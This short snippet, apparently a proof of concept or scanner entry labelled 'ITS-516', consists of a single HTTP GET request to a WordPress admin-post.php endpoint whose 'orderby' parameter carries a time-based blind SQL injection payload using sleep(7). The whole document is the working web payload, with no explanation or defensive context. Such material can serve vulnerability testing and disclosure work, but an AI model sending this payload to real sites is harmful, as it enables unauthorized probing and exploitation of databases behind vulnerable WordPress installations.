# Vulnerable: ITS-516
GET /wp-admin/admin-post.php?action=csv_file&orderby=email%2c(select+*+from(select(sleep(7)))b)&order=desc
